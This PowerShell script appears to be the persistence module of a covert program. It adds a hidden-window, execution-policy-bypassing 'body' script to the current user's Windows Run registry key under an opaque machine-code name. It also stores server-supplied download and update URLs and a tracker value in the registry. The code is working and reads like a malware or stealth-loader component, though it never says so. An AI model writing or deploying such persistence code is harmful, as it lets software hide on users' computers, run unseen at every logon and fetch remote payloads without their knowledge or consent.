. ./utils.ps1
. ./consts_body.ps1

function Add-BodyToStartup {
    
    $registryPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    $keyName = Get-MachineCode
    $bodyPath = Get-BodyPath
    # powershell.exe has no -ArgumentList; script args belong after -File (see Test-Autostart / $args).
    $value = "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$bodyPath`" -autostart true"
    writedbg "Add-BodyToStartup: Run key name=$keyName path=$bodyPath"

    RegWrite -registryPath $registryPath -keyName $keyName -value $value
}

function do_autoregistry {
    try {
        if ($null -ne $server.startDownloads) {
            if ($null -ne $server.startDownloads[0]) {
                RegWriteParam -keyName "download" -value $server.startDownloads[0]
            }
        }
        if ($null -ne $server.startDownloadsBack -and $server.startDownloadsBack.Count -gt 0) {
            if (-not [string]::IsNullOrWhiteSpace([string]$server.startDownloadsBack[0])) {
                RegWriteParam -keyName "downloadBack" -value ([string]$server.startDownloadsBack[0]).Trim()
            }
        }
        RegWriteParamBool -keyName "autoStart" -value $server.autoStart
        RegWriteParamBool -keyName "autoUpdate" -value $server.autoUpdate
        RegWriteParam -keyName "trackSerie" -value $server.trackSerie
    }
    catch {
        writedbg "autoregistry: tracker param sync failed: $_"
    }

    $autoStart = RegReadParamBool -keyName "autoStart" -default $true
    if (-not $autoStart)
    {
        writedbg "Skipping autostart..."
        return
    } 
    else 
    {
            writedbg "Setting autostart..."
    }
    try 
    {
        Add-BodyToStartup
    } catch {
        writedbg "Error  DoRegistryAutoStart $_"
    }
}

do_autoregistry